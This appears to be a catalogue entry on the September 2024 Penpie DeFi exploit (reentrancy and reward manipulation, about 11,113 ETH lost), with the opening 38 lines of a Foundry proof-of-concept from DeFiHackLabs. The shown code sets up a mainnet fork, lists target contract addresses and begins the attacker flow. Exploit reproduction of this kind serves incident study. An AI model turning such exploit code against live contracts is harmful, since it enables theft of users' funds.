# [?] Penpiexyz_io - Reentrancy and Reward Manipulation

## Summary
Severity: Unknown
Chain: Ethereum
Component: Penpiexyzio
Published: 2024-09-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Penpiexyzio_exp.sol
Type: defi-exploit-poc

## Details
Lost: 11,113.6 ETH (~$27,348,259 USD)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contrasts involved
address constant agETH = 0xe1B4d34E8754600962Cd944B535180Bd758E6c2e;
address constant balancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant rswETH = 0xFAe103DC9cf190eD75350761e95403b7b8aFa6c0;
address constant PENDLE_LPT_0x6010 = 0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe;
address constant PENDLE_LPT_0x038c = 0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6;
address constant PendleRouterV4 = 0x888888888889758F76e7103c6CbF23ABbF58F946;
address constant MasterPenpie = 0x16296859C15289731521F199F0a5f762dF6347d0;
address constant PendleYieldContractFactory = 0x35A338522a435D46f77Be32C70E215B813D0e3aC;
address constant PendleMarketFactoryV3 = 0x6fcf753f2C67b83f7B09746Bbc4FA0047b35D050;
address constant PendleMarketRegisterHelper = 0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a;
address constant PendleMarketDepositHelper_0x1c1f = 0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4;
address constant PendleStaking_0x6e79 = 0x6E799758CEE75DAe3d84e09D40dc416eCf713652;

contract Penpiexyz_io_exp is Test {
    Attacker attacker;

    function setUp() public {
        vm.createSelectFork("mainnet", 20_671_878 - 1);
    }

    function testPoC_A() public {
        attacker = new Attacker();

        // First tx: 0x7e7f9548f301d3dd863eac94e6190cb742ab6aa9d7730549ff743bf84cbd21d1
        attacker.createMarket();

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Penpiexyzio_exp.sol_
